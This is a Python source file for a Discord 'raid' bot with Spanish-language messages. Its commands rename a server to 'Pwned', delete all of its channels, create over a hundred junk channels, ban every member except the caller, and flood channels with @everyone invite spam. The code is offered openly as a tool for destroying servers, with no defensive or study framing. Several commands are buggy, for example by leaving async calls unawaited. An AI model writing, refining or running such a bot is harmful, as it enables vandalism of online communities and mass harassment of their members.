import discord
from discord.ext import commands
import asyncio
import time
import requests 
import random
import json


with open("config.json", "r") as data_1:
   data = json.load(data_1)




Intents = discord.Intents.all()

bot = commands.Bot(command_prefix="$", intents=Intents)

token = data["token"]



@bot.event
async def on_ready():
    print(f" EDX PROYECT |  BOT RAID V2 | USER: {bot.user} ")
    await bot.change_presence(
       status=discord.Status.online,
       activity=discord.Streaming(name="$ Tussi by $keiz", url="https://twitch.tv/tussi_domina")                   
  )

@bot.event
async def on_command_error(ctx, error):
    if isinstance(error, commands.CommandNotFound):
        embed = discord.Embed(
            title="⚠  Error.",
            description="El comando que estás intentando ejecutar no existe.\n\nPor favor ejecuta `$cmds` y revisa la lista de comandos.",

        )
        embed.set_thumbnail(url="https://cdn.discordapp.com/attachments/1379635299696509042/1379875946794057789/Picsart_25-06-04_13-34-10-933.png?ex=6841d51e&is=6840839e&hm=50d324985218ac88b0b934307e774dcceceb51cf6df26ef01c85d11f72e0e379&")
        await ctx.author.send(embed=embed)

    elif isinstance(error, commands.MissingRequiredArgument):
        embed = discord.Embed(
            title="⚠  Error.",
            description="Faltan argumentos en el comando.\n\nEjecuta `$cmds` y verifica cómo usarlo correctamente.",

        )
        embed.set_thumbnail(url="https://cdn.discordapp.com/attachments/1379635299696509042/1379875946794057789/Picsart_25-06-04_13-34-10-933.png?ex=6841d51e&is=6840839e&hm=50d324985218ac88b0b934307e774dcceceb51cf6df26ef01c85d11f72e0e379&")
        await ctx.author.send(embed=embed)

    elif isinstance(error, commands.MissingPermissions):
        embed = discord.Embed(
            title="⚠  Error.",
            description="El bot tiene permisos insuficientes y no se pudo \nejecutar el comando citado.\n\nPorfavor subir el  bot al rol mas alto posible y asegurarte de que tenga administrador.\n\n",

        )
        embed.set_thumbnail(url="https://cdn.discordapp.com/attachments/1379635299696509042/1379875946794057789/Picsart_25-06-04_13-34-10-933.png?ex=6841d51e&is=6840839e&hm=50d324985218ac88b0b934307e774dcceceb51cf6df26ef01c85d11f72e0e379&")
        await ctx.author.send(embed=embed)

    elif isinstance(error, commands.CommandOnCooldown):
        embed = discord.Embed(
            title="⚠  Error.",
            description=f"No puedes ejecutar el comando porque tienes un tiempo de espera de: {round(error.retry_after, 2)}.\n\nPorfavor Espera que acabe tu cooldown.\n\n",
   
        )
        embed.set_thumbnail(url="https://cdn.discordapp.com/attachments/1379635299696509042/1379875946794057789/Picsart_25-06-04_13-34-10-933.png?ex=6841d51e&is=6840839e&hm=50d324985218ac88b0b934307e774dcceceb51cf6df26ef01c85d11f72e0e379&")
        await ctx.author.send(embed=embed)

    else:
        # Error desconocido
        embed = discord.Embed(
            title="⚠  Error desconocido.",
            description="Ha ocurrido un error no manejado.\n\nPor favor contacta al staff del bot.",

        )
        embed.set_thumbnail(url="https://cdn.discordapp.com/attachments/1379635299696509042/1379875946794057789/Picsart_25-06-04_13-34-10-933.png?ex=6841d51e&is=6840839e&hm=50d324985218ac88b0b934307e774dcceceb51cf6df26ef01c85d11f72e0e379&")
        await ctx.author.send(embed=embed)
        raise error  

@bot.command()
@commands.cooldown(rate=1, per=120, type=commands.BucketType.user)
async def on(ctx):
    await ctx.message.delete()

   
    await ctx.guild.edit(name=f"Pwned by {ctx.author.name} #TU$$I")
   

    users_count = ctx.guild.member_count
    guild_name = ctx.guild.name

    tasks = []
  
    embed = discord.Embed(
      title="<a:world_black:1378811227026886837> Command Executed",
      description=f"<a:1375862421259816980:1379209533280489542>  Command: `on`\n<a:1375862421259816980:1379209533280489542> Guild: `{guild_name}`\n<a:1375862421259816980:1379209533280489542> Members: `´{users_count}`\n\n**Warning**: El bot tiene un cooldown de 120s o 60s dependiendo el comando."
   
     )

    embed.set_thumbnail(url="https://cdn.discordapp.com/attachments/1379635299696509042/1379857867359785040/f708224f41f29249.gif?ex=6841c448&is=684072c8&hm=c26c9a6a0df3d00812b271a37df7340ca32b9e8a17ab95e82d6a5218d71dca89&")

    await ctx.author.send(embed=embed)
    
    purge_channels = ctx.guild.channels

    for channel in purge_channels:
    
              tasks.append(channel.delete()) 
   
    await asyncio.gather(*tasks)

    channels_raid = ["I̴n̴j̴e̴c̴t̴e̴d̴ ̴b̴y̴ ̴yoix", 
                    
                     "o̶w̶n̶e̶d̶ ̶b̶y̶ ̶yoix", 
        
                     "t̴u̴s̴s̴y̴g̴a̴n̴g̴yoix"
                    
                     ]
     
    

    creation_channels = []
   
    
    for i in range(90):
    
      channel_name = random.choice(channels_raid)      
     
      creation_channels.append(ctx.guild.create_text_channel(channel_name))

    embed = discord.Embed(
       description="<a:1375862421259816980:1379209533280489542>  \n\n `viperiumgvng`\n\n\n**Best Rbot viperiumgvng** <a:maripose:1378891732778745946>\n\nall pwned tyoix\n"
    )

    embed.set_image(url="https://cdn.discordapp.com/attachments/1379635299696509042/1379953221790994522/a_1893f56711cb8133e84a215a56103a5d.gif?ex=68421d16&is=6840cb96&hm=c45c47c48007c995aef840e1606a63d90ca45b595510477f06b4ff21a73b2df8&")
    created_channels = await asyncio.gather(*creation_channels)

    spam_messages = []

    for channel in created_channels:
       
       for i in range(50):
    
      
        spam_messages.append(channel.send("> 〔@everyone〕https://discord.gg/amndNdDp discord.gg/yoix  Raid by yoix", embed=embed))
           
           
    await asyncio.gather(*spam_messages)




@bot.command()
async def massban(ctx):
   ctx.message.delete()

   
   await ctx.message.delete()

   members_guild = ctx.guild.members
   
   task = []
   

      
      
   users_count = ctx.guild.member_count
   guild_name = ctx.guild.name
      
   
   embed = discord.Embed(
      title="<a:world_black:1378811227026886837> Command Executed",
      description=f"<a:1375862421259816980:1379209533280489542>  Command: `massban`\n<a:1375862421259816980:1379209533280489542> Guild: `{guild_name}`\n<a:1375862421259816980:1379209533280489542> Members: `´{users_count}`\n\n**Warning**: El bot tiene un cooldown de 120s o 60s dependiendo el comando."
   
     )

   embed.set_thumbnail(url="https://cdn.discordapp.com/attachments/1379635299696509042/1379857867359785040/f708224f41f29249.gif?ex=6841c448&is=684072c8&hm=c26c9a6a0df3d00812b271a37df7340ca32b9e8a17ab95e82d6a5218d71dca89&")

   await ctx.author.send(embed=embed)
   
   
 
   for member in members_guild:
   
        if member.id == ctx.author.id:
         continue
    
        else:
         task.append(member.ban(reason="Massban Fasted by Tu$$i bot"))
     
      
        asyncio.gather(*task)


@bot.command()
@commands.cooldown(rate=1, per=120, type=commands.BucketType.user)
async def deletechannels(ctx):
 await ctx.message.delete()


 users_count = ctx.guild.member_count
 guild_name = ctx.guild.name
      
   
 embed = discord.Embed(
      title="<a:world_black:1378811227026886837> Command Executed",
      description=f"<a:1375862421259816980:1379209533280489542>  Command: `deletechannels`\n<a:1375862421259816980:1379209533280489542> Guild: `{guild_name}`\n<a:1375862421259816980:1379209533280489542> Members: `´{users_count}`\n\n**Warning**: El bot tiene un cooldown de 120s o 60s dependiendo el comando."
   
     )

 embed.set_thumbnail(url="https://cdn.discordapp.com/attachments/1379635299696509042/1379857867359785040/f708224f41f29249.gif?ex=6841c448&is=684072c8&hm=c26c9a6a0df3d00812b271a37df7340ca32b9e8a17ab95e82d6a5218d71dca89&")
   
 await ctx.author.send(embed=embed)

 tasks = []

 purge_channels = ctx.guild.channels

 for channel in purge_channels:
       tasks.append(channel.delete()) 
   
       asyncio.gather(*tasks)
      
       
      
       

@bot.command()
@commands.cooldown(rate=1, per=120, type=commands.BucketType.user)
async def createchannels(ctx):
  await ctx.message.delete()

  users_count = ctx.guild.member_count
  guild_name = ctx.guild.name
     

  embed = discord.Embed(
      title="<a:world_black:1378811227026886837> Command Executed",
      description=f"<a:1375862421259816980:1379209533280489542>  Command: `createchannels`\n<a:1375862421259816980:1379209533280489542> Guild: `{guild_name}`\n<a:1375862421259816980:1379209533280489542> Members: `´{users_count}`\n\n**Warning**: El bot tiene un cooldown de 120s o 60s dependiendo el comando."
   
     )

  embed.set_thumbnail(url="https://cdn.discordapp.com/attachments/1379635299696509042/1379857867359785040/f708224f41f29249.gif?ex=6841c448&is=684072c8&hm=c26c9a6a0df3d00812b271a37df7340ca32b9e8a17ab95e82d6a5218d71dca89&")
   
  await ctx.author.send(embed=embed)

   

  creation_channels = []

  for i in range(120):
      
    channels_raid = ["I̴n̴j̴e̴c̴t̴e̴d̴ ̴b̴y̴ ̴t̴u̴s̴s̴y̴g̴a̴n̴g̴", 
                    
                     "o̶w̶n̶e̶d̶ ̶b̶y̶ ̶t̶u̶s̶s̶i̶g̶a̶n̶g̶", 
        
                     "t̴u̴s̴s̴y̴g̴a̴n̴g̴ ̴n̴e̴v̴e̴r̴d̴i̴e̴s̴"
                    
                     ]
    
    channel_name = random.choice(channels_raid)

    raid_channels = creation_channels.append(ctx.guild.create_text_channel(channel_name))
   
    asyncio.gather(*creation_channels)
     
      
@bot.command()
async def spam(ctx):
  await ctx.message.delete()

  spam_channels = ctx.guild.text_channels
  spam_messages = []
  
  users_count = ctx.guild.member_count
  guild_name = ctx.guild.name
     

  embed = discord.Embed(
      title="<a:world_black:1378811227026886837> Command Executed",
      description=f"<a:1375862421259816980:1379209533280489542>  Command: `spam`\n<a:1375862421259816980:1379209533280489542> Guild: `{guild_name}`\n<a:1375862421259816980:1379209533280489542> Members: `´{users_count}`\n\n**Warning**: El bot tiene un cooldown de 120s o 60s dependiendo el comando."
   
     )

  embed.set_thumbnail(url="https://cdn.discordapp.com/attachments/1379635299696509042/1379857867359785040/f708224f41f29249.gif?ex=6841c448&is=684072c8&hm=c26c9a6a0df3d00812b271a37df7340ca32b9e8a17ab95e82d6a5218d71dca89&")
   
  await ctx.author.send(embed=embed)

  
  for channel in spam_channels:
   
      for _ in range(5):
     
       spam_messages.append(channel.send("> 〔@everyone〕discord.gg/yoix"))

  asyncio.gather(*spam_messages)
           
@bot.command()
@commands.cooldown(rate=1, per=120, type=commands.BucketType.user)
async def nuke(ctx):
   ctx.message.delete

   users_count = ctx.guild.member_count
   guild_name = ctx.guild.name
     

   embed = discord.Embed(
      title="<a:world_black:1378811227026886837> Command Executed",
      description=f"<a:1375862421259816980:1379209533280489542>  Command: `nuke`\n<a:1375862421259816980:1379209533280489542> Guild: `{guild_name}`\n<a:1375862421259816980:1379209533280489542> Members: `´{users_count}`\n\n**Warning**: El bot tiene un cooldown de 120s o 60s dependiendo el comando."
   
     )

   embed.set_thumbnail(url="https://cdn.discordapp.com/attachments/1379635299696509042/1379857867359785040/f708224f41f29249.gif?ex=6841c448&is=684072c8&hm=c26c9a6a0df3d00812b271a37df7340ca32b9e8a17ab95e82d6a5218d71dca89&")
   
   await ctx.author.send(embed=embed)

   

 

   tasks = []

   purge_channels = ctx.guild.channels

   for channel in purge_channels:
       tasks.append(channel.delete()) 
   
       asyncio.gather(*tasks)

   nuke_channel = await ctx.guild.create_text_channel(f"nuked by {ctx.author.name}")

   await  nuke_channel.send("> 〔@everyone〕https://discord.gg/amndNdDp discord.gg/yoix")

@bot.command()
async def invite(ctx):
  embed_invite_1 = discord.Embed(
      
      description=f"<a:1375862421259816980:1379209533280489542> **Revisa tu MD!**"

    )
    
  await ctx.reply(embed=embed_invite_1)

  embed_invite_2 = discord.Embed(
    
      description=f"<a:1375862421259816980:1379209533280489542>\n\n[Invitame Aqui](https://discord.com/oauth2/authorize?client_id=1378601839880048681)\n"

    )
  
  await ctx.author.send(embed=embed_invite_2)


@bot.command()
async def cmds(ctx):
   embed_invite_1 = discord.Embed(
    
      description=f"""<a:maripose:1378891732778745946>  **Commands List**\n\n<a:hashtag:1378891675145076936> `Free;`\n\n<a:brand:1378893022590406717>  `$on` Fuck Server.\n\n<a:brand:1378893022590406717>  `$createchannels` Create 120 channels.\n\n<a:brand:1378893022590406717>  `$deletechannels` Nuke All Channels.\n\n<a:brand:1378893022590406717>  `$nuke` Delete all channels and create one channel send invite.\n\n<a:brand:1378893022590406717>  `$massban` Banall Fast all users.\n\n<a:brand:1378893022590406717>  `$spam` Spam all channels.\n\n**Warning:** La mayoria de comandos tienen cooldown!"""
      
    )
   
   embed_invite_1.set_image(url="https://cdn.discordapp.com/attachments/1379635299696509042/1379873000345698334/Badass_Love_GIF_-_Badass_Love_Jdm_-_Discover__Share_GIFs.gif?ex=6841d260&is=684080e0&hm=9b896b31319c047ecf74faa3b9427c5ec5ad09ee6847f23d00eb9d9cd1a4550bs")
    
   await ctx.author.send(embed=embed_invite_1)
   
bot.run(token)
